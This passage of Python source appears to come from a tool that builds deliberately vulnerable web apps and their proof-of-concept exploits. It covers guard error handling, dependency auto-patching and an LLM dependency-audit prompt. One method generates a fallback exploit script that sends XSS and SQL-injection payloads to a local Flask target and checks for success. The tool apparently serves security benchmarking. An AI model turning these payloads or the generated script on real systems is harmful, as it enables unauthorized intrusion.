                    "observed": mismatch,
                    "evidence": mismatch,
                }
            )
        for op in unsupported_ops:
            must_fix.append(
                {
                    "kind": "unsupported_op",
                    "target": f"generator_assertion.op={op}",
                    "expected": "supported generator op",
                    "observed": op,
                    "evidence": "unsupported guard assertion op",
                }
            )
        for dep in missing_dependencies:
            must_fix.append(
                {
                    "kind": "dependency",
                    "target": dep,
                    "expected": "declared and installed dependency",
                    "observed": "missing",
                    "evidence": dep,
                }
            )

        semantic_gaps: List[Dict[str, Any]] = []
        signature = self._guard_spec_payload.get("semantic_signature") if isinstance(self._guard_spec_payload, dict) else {}
        if not isinstance(signature, dict):
            signature = {}
        for bucket in ("input_vector", "sink", "exploit_precondition"):
            if not any(bucket in str(note).lower() and "not observed" in str(note).lower() for note in notes):
                continue
            required_terms = signature.get(bucket) if isinstance(signature.get(bucket), list) else []
            semantic_gaps.append(
                {
                    "bucket": bucket,
                    "required_terms": [str(item).strip() for item in required_terms if str(item).strip()],
                    "observed_signals": [],
                }
            )

        loop_index = self._current_loop_index()
        normalization_suggestions = []
        if schema_errors:
            normalization_suggestions.append(
                "Normalize assertion keys: dep/name/package, deps/names/packages, string/contains/needle, regex/pattern."
            )
        if schema_normalizations:
            normalization_suggestions.append(
                "Apply prior normalization mappings from guard_spec.normalization.schema_mismatches before retry."
            )
        if unsupported_ops:
            normalization_suggestions.append("Replace unsupported guard ops with supported generator ops.")
        next_action = self._next_action_for_error_code(guard_error_code)
        prompt_instructions = [fix_hint]
        if unsupported_ops:
            prompt_instructions.append("Use only supported generator guard ops listed in supported_ops.")
        return build_hint_payload(
            sid=self.sid,
            vuln_id=vuln_id,
            slug=slug,
            loop=loop_index,
            guard_error_code=guard_error_code,
            must_fix=must_fix,
            semantic_gaps=semantic_gaps,
            supported_ops=sorted(SUPPORTED_GENERATOR_ASSERTION_OPS),
            normalization_suggestions=normalization_suggestions,
            next_action=next_action,
            prompt_instructions=prompt_instructions,
        )

    def _current_loop_index(self) -> int:
        loop_state_path = self._metadata_root() / "loop_state.json"
        if not loop_state_path.exists():
            return 0
        try:
            payload = json.loads(loop_state_path.read_text(encoding="utf-8"))
        except Exception:
            return 0
        try:
            return int(payload.get("current_loop", 0))
        except Exception:
            return 0

    @staticmethod
    def _next_action_for_error_code(code: str) -> Dict[str, Any]:
        normalized = str(code or "").strip().lower()
        if normalized == "guard_dsl_unsupported_op":
            return {
                "retry_stage": "RESEARCH",
                "researcher_refresh": True,
                "rationale": "unsupported guard DSL op requires GuardSpec regeneration",
            }
        if normalized == "guard_assertion_schema_error":
            return {
                "retry_stage": "GENERATOR",
                "researcher_refresh": False,
                "rationale": "normalize assertion parameters locally before researcher refresh",
            }
        if normalized == "guard_semantic_mismatch":
            return {
                "retry_stage": "GENERATOR",
                "researcher_refresh": False,
                "rationale": "attempt synthesis repair first; refresh researcher on repeated fingerprint",
            }
        if normalized == "guard_dependency_missing":
            return {
                "retry_stage": "GENERATOR",
                "researcher_refresh": False,
                "rationale": "dependency hints can be applied in synthesis/autofix before researcher refresh",
            }
        return {
            "retry_stage": "GENERATOR",
            "researcher_refresh": False,
            "rationale": "retry generation with updated guard hints",
        }

    @staticmethod
    def _extract_unsupported_ops(notes: List[str]) -> List[str]:
        pattern = re.compile(r"unsupported guard assertion op:\s*([a-zA-Z0-9_\-]+)", flags=re.IGNORECASE)
        detected: set[str] = set()
        for note in notes:
            if not isinstance(note, str):
                continue
            for match in pattern.findall(note):
                token = str(match).strip().lower()
                if token:
                    detected.add(token)
        return sorted(detected)

    @staticmethod
    def _extract_schema_errors(notes: List[str]) -> List[str]:
        matched: set[str] = set()
        patterns = [
            (r"dep_declared requires dep", "dep_declared.dep missing"),
            (r"any_dep_declared requires deps\[\]", "any_dep_declared.deps missing"),
            (r"file_contains requires path and string", "file_contains.string missing"),
            (r"file_not_contains requires path and string", "file_not_contains.string missing"),
            (r"file_regex_contains requires path and regex", "file_regex_contains.regex missing"),
            (r"file_regex_not_contains requires path and regex", "file_regex_not_contains.regex missing"),
            (r"file_regex_any requires globs\[\] and regex", "file_regex_any.globs/regex missing"),
        ]
        for note in notes:
            if not isinstance(note, str):
                continue
            lowered = note.strip().lower()
            for pattern, label in patterns:
                if re.search(pattern, lowered):
                    matched.add(label)
        return sorted(matched)

    @staticmethod
    def _extract_missing_dependency_names(notes: List[str]) -> List[str]:
        detected: set[str] = set()
        for note in notes:
            if not isinstance(note, str):
                continue
            lowered = note.strip().lower()
            single = re.search(r"missing dep declaration:\s*([a-z0-9_.+\-]+)", lowered)
            if single:
                detected.add(single.group(1).strip())
            any_match = re.search(r"none of deps declared:\s*([a-z0-9_, .+\-]+)", lowered)
            if any_match:
                for token in any_match.group(1).split(","):
                    cleaned = token.strip()
                    if cleaned:
                        detected.add(cleaned)
        return sorted(detected)

    @classmethod
    def _guard_error_code(
        cls,
        notes: List[str],
        *,
        unsupported_ops: Optional[List[str]] = None,
        schema_errors: Optional[List[str]] = None,
    ) -> str:
        unsupported = unsupported_ops if isinstance(unsupported_ops, list) else cls._extract_unsupported_ops(notes)
        schema_error_list = schema_errors if isinstance(schema_errors, list) else cls._extract_schema_errors(notes)
        joined = " ".join(note.lower() for note in notes if isinstance(note, str))
        if unsupported:
            return "guard_dsl_unsupported_op"
        if "guard semantic mismatch" in joined or "semantic mismatch" in joined:
            return "guard_semantic_mismatch"
        if schema_error_list:
            return "guard_assertion_schema_error"
        if (
            "missing dependency" in joined
            or "missing dep declaration:" in joined
            or "none of deps declared:" in joined
            or "not installed by build commands" in joined
        ):
            return "guard_dependency_missing"
        if "executor constraint violation" in joined:
            return "guard_executor_constraint"
        return "guard_violation"

    @staticmethod
    def _guard_error_subcode(notes: List[str], code: str) -> str:
        normalized_code = str(code or "").strip().lower()
        joined = " ".join(str(note).strip().lower() for note in notes if isinstance(note, str))
        if normalized_code == "guard_semantic_mismatch":
            if "missing input-to-sql composition path for cwe-89" in joined:
                return "cwe89_input_sql_path_missing"
            if "missing state-changing endpoint" in joined:
                return "cwe352_state_change_missing"
            if "csrf token validation detected" in joined:
                return "cwe352_csrf_protection_present"
            if "input_vector terms were not observed" in joined:
                return "semantic_signature_input_vector_missing"
            if "sink terms were not observed" in joined:
                return "semantic_signature_sink_missing"
            if "exploit_precondition terms were not observed" in joined:
                return "semantic_signature_precondition_missing"
            return "semantic_mismatch"
        if normalized_code == "guard_assertion_schema_error":
            if "dep_declared requires dep" in joined:
                return "dep_declared_dep_missing"
            if "any_dep_declared requires deps" in joined:
                return "any_dep_declared_deps_missing"
            if "requires path and regex" in joined:
                return "regex_assertion_params_missing"
            if "requires path and string" in joined:
                return "string_assertion_params_missing"
            return "assertion_schema_error"
        if normalized_code == "guard_dsl_unsupported_op":
            match = re.search(r"unsupported guard assertion op:\s*([a-z0-9_\-]+)", joined, flags=re.IGNORECASE)
            if match:
                return f"unsupported_op_{match.group(1).lower()}"
            return "unsupported_op"
        if normalized_code == "guard_dependency_missing":
            if "missing from requirements files" in joined:
                return "dependency_requirements_missing"
            if "not installed by build commands" in joined:
                return "dependency_build_install_missing"
            if "missing dependency" in joined or "missing dep declaration:" in joined or "none of deps declared:" in joined:
                return "dependency_decl_missing"
            return "dependency_missing"
        if normalized_code == "guard_executor_constraint":
            return "executor_constraint"
        return ""

    @staticmethod
    def _extract_semantic_missing_buckets(notes: List[str]) -> List[str]:
        buckets: set[str] = set()
        for note in notes:
            lowered = str(note or "").strip().lower()
            if "input_vector terms were not observed" in lowered:
                buckets.add("input_vector")
            if "sink terms were not observed" in lowered:
                buckets.add("sink")
            if "exploit_precondition terms were not observed" in lowered:
                buckets.add("exploit_precondition")
        return sorted(buckets)

    @staticmethod
    def _extract_builtin_semantic_errors(notes: List[str]) -> List[str]:
        errors: set[str] = set()
        for note in notes:
            lowered = str(note or "").strip().lower()
            if lowered.startswith("semantic mismatch:"):
                errors.add(lowered)
            if lowered.startswith("guard semantic mismatch: missing"):
                # Keep only builtin evaluator messages; signature bucket misses are tracked separately.
                if "terms were not observed" not in lowered:
                    errors.add(lowered)
        return sorted(errors)

    def _detect_node_required(self, manifest: Dict[str, Any]) -> set[str]:
        return {
            self._canonicalize_package_name(name)
            for name in detect_node_required(manifest, self._read_text_content)
        }

    def _extract_node_declared_sets(self, manifest: Dict[str, Any]) -> set[str]:
        return {
            self._canonicalize_package_name(name)
            for name in extract_node_declared(manifest, self._read_text_content)
            if self._canonicalize_package_name(name)
        }

    def _detect_node_installs(self, manifest: Dict[str, Any]) -> set[str]:
        dockerfile_entry = self._find_file_entry(manifest, "Dockerfile")
        dockerfile_text = self._read_text_content(dockerfile_entry) if dockerfile_entry else ""
        build_section = manifest.get("build")
        if not isinstance(build_section, dict):
            build_section = {}
        build_command = build_section.get("command") or ""
        installs = detect_node_installs(dockerfile_text, build_command or "")
        return {
            self._canonicalize_package_name(name)
            for name in installs
            if self._canonicalize_package_name(name)
        }

    def _maybe_auto_patch_dependencies(
        self,
        manifest: Dict[str, Any],
        declared: DeclaredDependencies,
        required_static: set[str],
        llm_section: Dict[str, Any] | None,
    ) -> Dict[str, Any]:
        info: Dict[str, Any] = {
            "enabled": True,
            "patched": [],
            "skipped": [],
            "patched_canonicals": [],
            "synced_requirements": [],
        }
        static_candidates: set[str] = set(required_static - declared.combined)
        candidate_names: set[str] = set(static_candidates)
        llm_candidates: set[str] = set()
        if llm_section:
            for suggestion in llm_section.get("suggestions", []) or []:
                name = suggestion.get("name") or suggestion.get("package")
                if name and suggestion.get("enforce"):
                    candidate_names.add(name)
                    llm_candidates.add(name)
        requirements_entry = self._ensure_requirements_entry(manifest)
        deps_list = manifest.setdefault("deps", [])
        if not isinstance(deps_list, list):
            deps_list = []
            manifest["deps"] = deps_list
        declared_deps = {
            self._canonicalize_package_name(self._strip_version(dep.split(" ", 1)[0]))
            for dep in deps_list
            if isinstance(dep, str)
        }
        declared_specs: Dict[str, str] = {}
        for dep in deps_list:
            if not isinstance(dep, str) or not dep.strip():
                continue
            dep_spec = dep.strip()
            canonical = self._canonicalize_package_name(self._strip_version(dep_spec.split(" ", 1)[0]))
            if canonical and canonical not in declared_specs:
                declared_specs[canonical] = dep_spec
        requirements_packages = self._extract_packages_from_requirements(requirements_entry.get("content", ""))
        missing_requirements = declared_deps - requirements_packages
        for canonical in sorted(missing_requirements):
            if canonical in self._auto_patch_denylist:
                continue
            declared_spec = declared_specs.get(canonical)
            if declared_spec:
                self._append_requirement_spec_line(requirements_entry, declared_spec)
                info["synced_requirements"].append({"name": canonical, "spec": declared_spec})
                continue
            version = self._default_versions.get(canonical)
            name = canonical
            if version:
                self._append_requirement_line(requirements_entry, name, version)
                info["synced_requirements"].append({"name": name, "version": version})
            else:
                info["synced_requirements"].append({"name": name, "reason": "no default version"})
        if not candidate_names:
            return info
        patched_canonicals: set[str] = set()
        for raw_name in sorted(candidate_names):
            canonical = self._canonicalize_package_name(raw_name)
            if not canonical:
                continue
            target_name = self._module_alias_map.get(canonical, canonical)
            target_canonical = self._canonicalize_package_name(target_name)
            if target_canonical in self._auto_patch_denylist:
                info["skipped"].append({"name": raw_name, "reason": "stdlib"})
                continue
            if target_canonical in self._stdlib_modules and target_name == canonical:
                info["skipped"].append({"name": raw_name, "reason": "stdlib"})
                continue
            if target_canonical in declared_deps or target_canonical in patched_canonicals:
                continue
            version = self._default_versions.get(target_canonical)
            if version is None:
                info["skipped"].append({"name": raw_name, "reason": "no default version"})
                continue
            spec = f"{target_name}=={version}"
            deps_list.append(spec)
            self._append_requirement_line(requirements_entry, target_name, version)
            patched_canonicals.add(target_canonical)
            info["patched"].append(
                {
                    "name": target_name,
                    "version": version,
                    "source": "llm" if raw_name in llm_candidates else "static",
                }
            )
        info["patched_canonicals"] = sorted(patched_canonicals)
        return info

    def _ensure_requirements_entry(self, manifest: Dict[str, Any]) -> Dict[str, Any]:
        files = manifest.setdefault("files", [])
        for entry in files:
            if not isinstance(entry, dict):
                continue
            path = (entry.get("path") or "").lower()
            if fnmatch.fnmatch(path, "requirements*.txt"):
                entry.setdefault("content", "")
                if not entry.get("description"):
                    entry["description"] = "Pinned deps for SBOM."
                return entry
        entry = {
            "path": "requirements.txt",
            "description": "Auto-generated requirements",
            "content": "",
        }
        files.append(entry)
        return entry

    def _append_requirement_line(self, entry: Dict[str, Any], package: str, version: str) -> None:
        content = entry.get("content") or ""
        existing = {
            self._canonicalize_package_name(
                self._strip_version(line.split("#", 1)[0].strip())
            )
            for line in content.splitlines()
            if line.strip()
        }
        canonical = self._canonicalize_package_name(package)
        if canonical in existing:
            return
        line = f"{package}=={version}" if version else package
        if content and not content.endswith("\n"):
            content += "\n"
        content += f"{line}\n"
        entry["content"] = content

    def _append_requirement_spec_line(self, entry: Dict[str, Any], spec: str) -> None:
        token = str(spec or "").strip()
        if not token:
            return
        content = entry.get("content") or ""
        existing = {
            self._canonicalize_package_name(
                self._strip_version(line.split("#", 1)[0].strip())
            )
            for line in content.splitlines()
            if line.strip()
        }
        canonical = self._canonicalize_package_name(self._strip_version(token))
        if canonical in existing:
            return
        if content and not content.endswith("\n"):
            content += "\n"
        content += f"{token}\n"
        entry["content"] = content

    def _extract_packages_from_requirements(self, content: str) -> set[str]:
        packages: set[str] = set()
        if not isinstance(content, str):
            return packages
        for raw_line in content.splitlines():
            token = raw_line.split("#", 1)[0].strip()
            if not token:
                continue
            canonical = self._canonicalize_package_name(self._strip_version(token))
            if canonical:
                packages.add(canonical)
        return packages

    def _is_stdlib_module(self, name: str) -> bool:
        normalized = (name or "").strip().lower().replace("_", "-")
        canonical = self._canonicalize_package_name(name)
        return normalized in self._stdlib_modules or canonical in self._stdlib_modules
    def _extract_declared_dependencies(self, manifest: Dict[str, Any]) -> DeclaredDependencies:
        combined: set[str] = set()
        from_deps_field: set[str] = set()
        from_requirements: set[str] = set()
        requirements_by_path: Dict[str, set[str]] = {}

        deps = manifest.get("deps") or []
        if isinstance(deps, list):
            for dep in deps:
                if not isinstance(dep, str):
                    continue
                canonical = self._normalize_dependency_token(dep)
                if not canonical:
                    continue
                combined.add(canonical)
                from_deps_field.add(canonical)

        for entry in manifest.get("files", []):
            if not isinstance(entry, dict):
                continue
            path = (entry.get("path") or "").strip()
            if not path:
                continue
            lowered = path.lower()
            content = self._read_text_content(entry)
            if not content:
                continue
            if fnmatch.fnmatch(lowered, "requirements*.txt"):
                packages = self._parse_requirements_content(content)
                requirements_by_path[path] = packages
                normalized_path = self._normalize_requirements_path(path)
                requirements_by_path.setdefault(normalized_path, packages)
                requirements_by_path.setdefault(f"./{normalized_path}", packages)
                for pkg in packages:
                    combined.add(pkg)
                    from_requirements.add(pkg)
            elif lowered == "pyproject.toml" and tomllib:
                try:
                    data = tomllib.loads(content)
                except (tomllib.TOMLDecodeError, AttributeError):  # pragma: no cover - parse guard
                    continue
                for pkg in self._extract_pyproject_dependencies(data):
                    combined.add(pkg)
            elif lowered == "setup.cfg":
                parser = configparser.ConfigParser()
                try:
                    parser.read_string(content)
                except configparser.Error:  # pragma: no cover - invalid cfg
                    continue
                install_requires = parser.get("options", "install_requires", fallback="")
                if install_requires:
                    packages = self._parse_requirements_content(install_requires)
                    for pkg in packages:
                        combined.add(pkg)

        return DeclaredDependencies(
            combined=combined,
            from_deps_field=from_deps_field,
            from_requirements=from_requirements,
            requirements_by_path=requirements_by_path,
        )

    def _detect_required_dependencies(self, manifest: Dict[str, Any]) -> set[str]:
        detected = {
            self._canonicalize_package_name(name)
            for name in detect_python_required(manifest, self._read_text_content)
        }
        return {name for name in detected if name and not self._is_stdlib_module(name)}

    def _llm_infer_dependencies(
        self,
        manifest: Dict[str, Any],
        required_static: set[str],
        declared: DeclaredDependencies,
    ) -> Dict[str, Any]:
        result: Dict[str, Any] = {
            "enabled": True,
            "missing_high_conf": [],
            "suggestions": [],
            "status": "skipped",
            "raw_excerpt": "",
        }

        try:
            messages = self._build_dep_guard_messages(manifest, required_static, declared)
            response = self.llm.generate(messages)
        except Exception as exc:  # pragma: no cover - safety
            LOGGER.warning("LLM dependency inference failed for %s: %s", self.sid, exc)
            result["status"] = f"error: {exc}"[:120]
            result["error"] = str(exc)
            return result

        result["raw_excerpt"] = response[:400]
        data = self._parse_json_response(response)
        if not isinstance(data, dict):
            result["status"] = "parse_error"
            return result

        python_section = data.get("python") or {}
        suggestions = self._normalize_llm_suggestions(python_section)
        result["suggestions"] = suggestions
        result["status"] = "ok"
        result["missing_high_conf"] = sorted(
            {entry["name"] for entry in suggestions if entry.get("enforce")}
        )
        result["mappings"] = python_section.get("mappings", [])
        return result

    def _manifest_requires_external_db(self, manifest: Dict[str, Any]) -> bool:
        rule_value = (self._rule or {}).get("requires_external_db") if hasattr(self, "_rule") else None
        if rule_value is not None:
            return bool(rule_value)
        deps = manifest.get("deps") or []
        for dep in deps:
            dep_lower = str(dep).lower()
            if any(package in dep_lower for package in EXTERNAL_DB_PACKAGES):
                return True
        files = manifest.get("files") or []
        for entry in files:
            content = entry.get("content")
            if not isinstance(content, str):
                continue
            lowered = content.lower()
            if any(keyword in lowered for keyword in EXTERNAL_DB_KEYWORDS):
                return True
        return False

    @staticmethod
    def _file_contains(manifest: Dict[str, Any], path: str | None, needle: str | None) -> bool:
        if not path or not needle:
            return False
        target = path.strip().lower()
        for entry in manifest.get("files", []):
            if not isinstance(entry, dict):
                continue
            current = str(entry.get("path") or "").strip().lower()
            if not current:
                continue
            if current == target or current.endswith(target):
                content = entry.get("content")
                if isinstance(content, str) and needle in content:
                    return True
        return False

    @staticmethod
    def _resolve_rule_path(path: str | None, manifest: Dict[str, Any]) -> Optional[str]:
        """Resolve rule pattern paths, handling template placeholders.

        - "{{service_entry}}" → first file with role "service_main" or "app.py" fallback.
        - other values are returned as-is.
        """
        if not path:
            return None
        token = path.strip()
        if not token:
            return None
        if token.startswith("{{") and "service_entry" in token:
            # Prefer explicit service_main role, then a conventional app.py path.
            files = manifest.get("files") or []
            service_path: Optional[str] = None
            for entry in files:
                if not isinstance(entry, dict):
                    continue
                role = normalize_role(entry.get("role"))
                entry_path = entry.get("path") or ""
                if role_matches(role, "service_main") and isinstance(entry_path, str) and entry_path:
                    service_path = entry_path
                    break
            if service_path:
                return service_path
            # Fallback: keep behaviour compatible with legacy templates.
            return "app.py"
        return path

    @staticmethod
    def _poc_contains(manifest: Dict[str, Any], needle: str) -> bool:
        if not needle:
            return False
        # Inspect files explicitly marked as the PoC entry (or named poc.*).
        for entry in manifest.get("files", []):
            if not isinstance(entry, dict):
                continue
            role = normalize_role(entry.get("role"))
            path = str(entry.get("path") or "").strip()
            if not path:
                continue
            name = Path(path).name.strip().lower()
            if role_matches(role, "poc_entry") or name.startswith("poc."):
                content = entry.get("content")
                if isinstance(content, str) and needle in content:
                    return True
        return False

    @staticmethod
    def _manifest_contains_literal(manifest: Dict[str, Any], needle: str) -> bool:
        if not needle:
            return False
        poc = manifest.get("poc")
        if isinstance(poc, dict):
            for value in poc.values():
                if isinstance(value, str) and needle in value:
                    return True
        for entry in manifest.get("files", []):
            if not isinstance(entry, dict):
                continue
            content = entry.get("content")
            if isinstance(content, str) and needle in content:
                return True
        return False

    def _manifest_file_text(self, manifest: Dict[str, Any], path: str) -> str:
        target = (path or "").strip().lstrip("./").lower()
        if not target:
            return ""
        for entry in manifest.get("files", []):
            if not isinstance(entry, dict):
                continue
            current = str(entry.get("path") or "").strip().lstrip("./").lower()
            if not current:
                continue
            if current == target or current.endswith(target):
                content = entry.get("content")
                if isinstance(content, str):
                    return content
        return ""

    def _infer_fallback_endpoint(self, manifest: Dict[str, Any]) -> Dict[str, Any]:
        """Infer a basic endpoint for fallback PoCs without CWE-specific tables.

        - Prefer reflection-style endpoints (e.g., `/reflect`) when detected.
        - Otherwise, pick the first non-health Flask route found in the service entry.
        - Fall back to `/` when nothing can be inferred.
        """

        service_path = self._resolve_rule_path("{{service_entry}}", manifest) or "app.py"
        content = self._manifest_file_text(manifest, service_path)
        lowered = content.lower()

        param_key = "q"
        for pattern in (
            r"request\.args\.get\(\s*['\"]([^'\"]+)['\"]",
            r"request\.form\.get\(\s*['\"]([^'\"]+)['\"]",
        ):
            match = re.search(pattern, content)
            if match and match.group(1):
                param_key = match.group(1)
                break

        if "/reflect" in lowered:
            return {"method": "get", "path": "/reflect", "param": param_key, "expect_reflection": True}

        routes: List[Tuple[str, str]] = []
        for match in re.finditer(
            r"@app\.(get|post|put|delete|patch)\(\s*['\"]([^'\"]+)['\"]",
            content,
        ):
            routes.append((match.group(1).lower(), match.group(2)))
        for match in re.finditer(
            r"@app\.route\(\s*['\"]([^'\"]+)['\"]\s*(?:,\s*methods\s*=\s*\[([^\]]+)\])?",
            content,
        ):
            path = match.group(1)
            methods_blob = match.group(2)
            methods: List[str] = []
            if methods_blob:
                for token in methods_blob.split(","):
                    token = token.strip().strip("'\"")
                    if token:
                        methods.append(token.lower())
            if not methods:
                methods = ["get"]
            for method in methods:
                routes.append((method, path))

        for method, path in routes:
            if not path or path in {"/health", "/favicon.ico"}:
                continue
            if path == "/":
                continue
            return {"method": method, "path": path, "param": param_key, "expect_reflection": False}

        return {"method": "get", "path": "/", "param": param_key, "expect_reflection": False}

    def _build_fallback_poc_content(
        self,
        manifest: Dict[str, Any],
        template: Dict[str, Any] | str,
        flag_token: str | None = None,
    ) -> str:
        endpoint = self._infer_fallback_endpoint(manifest)
        method = str(endpoint.get("method") or "get").lower()
        path = str(endpoint.get("path") or "/")
        param = str(endpoint.get("param") or "q")
        expect_reflection = bool(endpoint.get("expect_reflection"))
        if isinstance(template, dict):
            poc_template = dict(template)
        else:
            poc_template = {
                "success_signature": str(template or "Exploit SUCCESS"),
                "flag_token": str(flag_token or ""),
            }
        success_signature = (
            str(poc_template.get("success_signature") or "Exploit SUCCESS").strip() or "Exploit SUCCESS"
        )
        flag_token = str(poc_template.get("flag_token") or "").strip()
        json_success_key = str(poc_template.get("json_success_key") or "").strip()
        json_flag_key = str(poc_template.get("json_flag_key") or "").strip()
        has_json_success_value = "json_success_value" in poc_template
        json_success_value = poc_template.get("json_success_value")

        default_payload = "<script>alert(1)</script>"
        if "login" in path.lower() or "username" in param.lower():
            default_payload = "' OR '1'='1"
        elif "transfer" in path.lower() or method == "post":
            default_payload = "250"

        lines = [
            "import argparse",
            "import json",
            "import sys",
            "from urllib.parse import urlencode",
            "from urllib.request import Request, urlopen",
            "from urllib.error import URLError, HTTPError",
            "",
            "DEFAULT_BASE = 'http://127.0.0.1:5000'",
            f"METHOD = {method!r}",
            f"PATH = {path!r}",
            f"PARAM = {param!r}",
            f"EXPECT_REFLECTION = {expect_reflection!r}",
            f"SUCCESS_SIGNATURE = {success_signature!r}",
            f"FLAG_TOKEN = {flag_token!r}",
            f"JSON_SUCCESS_KEY = {json_success_key!r}",
            f"JSON_SUCCESS_HAS_VALUE = {has_json_success_value!r}",
            f"JSON_SUCCESS_VALUE = {json.dumps(json_success_value, ensure_ascii=False)!r}",
            f"JSON_FLAG_KEY = {json_flag_key!r}",
            f"DEFAULT_PAYLOAD = {default_payload!r}",
            "",
            "def _request(base_url: str, payload: str) -> tuple[int, str]:",
            "    url = base_url.rstrip('/') + PATH",
            "    params = {PARAM: payload} if PARAM else {}",
            "    data = None",
            "    headers = {}",
            "    if METHOD == 'post':",
            "        data = urlencode(params).encode('utf-8')",
            "        headers['Content-Type'] = 'application/x-www-form-urlencoded'",
            "    elif params:",
            "        url = url + ('?' + urlencode(params))",
            "    req = Request(url, data=data, method=METHOD.upper(), headers=headers)",
            "    with urlopen(req, timeout=5) as resp:",
            "        status = getattr(resp, 'status', None) or resp.getcode()",
            "        body = resp.read().decode('utf-8', errors='ignore')",
            "    return int(status), body",
            "",
            "def _json_success(body: str) -> bool:",
            "    if not JSON_SUCCESS_KEY:",
            "        return False",
            "    try:",
            "        payload = json.loads(body)",
            "    except Exception:",
            "        return False",
            "    if JSON_SUCCESS_KEY not in payload:",
            "        return False",
            "    expected = json.loads(JSON_SUCCESS_VALUE) if JSON_SUCCESS_HAS_VALUE else None",
            "    if JSON_SUCCESS_HAS_VALUE and payload.get(JSON_SUCCESS_KEY) != expected:",
            "        return False",
            "    if JSON_FLAG_KEY and FLAG_TOKEN and payload.get(JSON_FLAG_KEY) != FLAG_TOKEN:",
            "        return False",
            "    return True",
            "",
            "def exploit(base_url: str, payload: str) -> bool:",
            "    try:",
            "        status, body = _request(base_url, payload)",
            "    except (HTTPError, URLError, ValueError) as exc:",
            "        print(f'[fallback] request failed: {exc}', file=sys.stderr)",
            "        return False",
            "    if status >= 400:",
            "        return False",
            "    if _json_success(body):",
            "        return True",
            "    if EXPECT_REFLECTION and payload not in body:",
            "        return False",
            "    if SUCCESS_SIGNATURE and SUCCESS_SIGNATURE in body:",
            "        if FLAG_TOKEN and FLAG_TOKEN not in body:",
            "            return False",
            "        return True",
            "    return True",
            "",
            "def main() -> None:",
            "    parser = argparse.ArgumentParser(description='Fallback PoC executor')",
            "    parser.add_argument('--base-url', default=DEFAULT_BASE)",
            "    parser.add_argument('--payload', default=DEFAULT_PAYLOAD)",
            "    args = parser.parse_args()",
            "    if exploit(args.base_url, args.payload):",
            "        print(SUCCESS_SIGNATURE)",
            "        if FLAG_TOKEN:",
            "            print(FLAG_TOKEN)",
            "        sys.exit(0)",
            "    sys.exit(1)",
            "",
            "if __name__ == '__main__':",
            "    main()",
            "",
        ]
        return "\n".join(lines) + "\n"

    def _build_dep_guard_messages(
        self,
        manifest: Dict[str, Any],
        required_static: set[str],
        declared: DeclaredDependencies,
    ) -> List[Dict[str, str]]:
        system = (
            "You are a dependency auditor for vulnerable app bundles. "
            "Given code snippets and static detector output, infer missing runtime dependencies. "
            "Reply with strict JSON following the schema described in the user prompt."
        )
        snippets = self._gather_file_snippets(manifest)
        payload = {
            "static_analysis": {
                "declared": sorted(declared.combined),
                "required_static": sorted(required_static),
            },
            "file_snippets": snippets,
        }
        schema_hint = {
            "python": {
                "missing": [
                    {"name": "package", "reason": "why", "confidence": "high|medium|low"}
                ],
                "mappings": [
                    {"module": "module name", "package": "distribution", "confidence": "high|medium|low"}
                ],
            },
            "node": {
                "missing": [],
            },
            "apt": {
                "missing": [],
            },
        }
        instructions = (
            "Analyze the snippets and static findings. "
            "Only include packages that are NOT clearly declared. "
            "If unsure, mark confidence as low. High confidence entries should only be used when the import clearly maps to a package. "
            "Respond with JSON matching this schema; omit empty sections."
        )
        user_content = (
            f"{instructions}\n\n"
            f"# Schema\n{json.dumps(schema_hint, indent=2, ensure_ascii=False)}\n\n"
            f"# Context\n{json.dumps(payload, indent=2, ensure_ascii=False)}"
        )
        return [
            {"role": "system", "content": system},
            {"role": "user", "content": user_content},
        ]

    def _gather_file_snippets(self, manifest: Dict[str, Any], *, max_files: int = 6, max_chars: int = 400) -> List[Dict[str, str]]:
        snippets: List[Dict[str, str]] = []
        for entry in manifest.get("files", []):
            if len(snippets) >= max_files:
                break
            if not isinstance(entry, dict):
                continue
            path = (entry.get("path") or "").strip()
            content = self._read_text_content(entry)
            if not path or not content:
                continue
            snippets.append(
                {
                    "path": path,
                    "language": self._guess_language(path),
                    "snippet": content[:max_chars],
                }
            )
        return snippets

    @staticmethod
    def _guess_language(path: str) -> str:
        suffix = Path(path).suffix.lower().lstrip(".")
        return suffix or "text"

    def _parse_json_response(self, raw: str) -> Any:
        try:
            return json.loads(raw)
        except json.JSONDecodeError:
            start = raw.find("{")
            end = raw.rfind("}")
            if start != -1 and end != -1 and end > start:
                snippet = raw[start : end + 1]
                try:
                    return json.loads(snippet)
                except json.JSONDecodeError:
                    return None
        return None

    def _normalize_llm_suggestions(self, python_section: Dict[str, Any]) -> List[Dict[str, Any]]:
        suggestions: List[Dict[str, Any]] = []
        missing = python_section.get("missing")
        if isinstance(missing, list):
            for entry in missing:
                if isinstance(entry, str):
                    name = entry
                    reason = ""
                    confidence = "high"
                    module = ""
                elif isinstance(entry, dict):
                    name = entry.get("name") or entry.get("package") or entry.get("dependency")
                    reason = entry.get("reason") or entry.get("detail") or ""
                    confidence = (entry.get("confidence") or "").lower() or "medium"
                    module = entry.get("module") or ""
                else:
                    continue
                canonical = self._canonicalize_package_name(name or "")
                if not canonical:
                    continue
                suggestions.append(
                    {
                        "name": canonical,
                        "reason": reason,
                        "confidence": confidence,
                        "module": module,
                        "enforce": confidence in {"high", "certain"},
                    }
                )
        return suggestions

    def _detect_build_installs(
        self,
        manifest: Dict[str, Any],
        requirements_by_path: Dict[str, set[str]],
    ) -> set[str]:
        installed: set[str] = set()

        dockerfile_entry = self._find_file_entry(manifest, "Dockerfile")
        texts: List[str] = []
        if dockerfile_entry:
            docker_text = self._read_text_content(dockerfile_entry)
            if docker_text:
                texts.append(docker_text)

        build_section = manifest.get("build")
        if isinstance(build_section, dict):
            build_command = build_section.get("command")
            if isinstance(build_command, str) and build_command.strip():
                texts.append(build_command)

        for text in texts:
            packages = self._parse_pip_installs(text, requirements_by_path)
            installed.update(packages)

        return installed

    def _parse_pip_installs(self, text: str, requirements_by_path: Dict[str, set[str]]) -> set[str]:
        packages: set[str] = set()
        if not text:
            return packages
        normalized_text = text.replace("\\\n", " ")
        for match in PIP_INSTALL_PATTERN.finditer(normalized_text):
            body = match.group("body") or ""
            packages.update(self._parse_pip_install_body(body, requirements_by_path))
        return packages

    def _parse_pip_install_body(self, body: str, requirements_by_path: Dict[str, set[str]]) -> set[str]:
        packages: set[str] = set()
        tokens = body.strip().split()
        idx = 0
        while idx < len(tokens):
            token = tokens[idx].strip().strip("'\"")
            lowered = token.lower()
            if not token:
                idx += 1
                continue
            if lowered in {"-r", "--requirement"}:
                idx += 1
                if idx < len(tokens):
                    packages.update(self._packages_from_requirements_path(tokens[idx], requirements_by_path))
                idx += 1
                continue
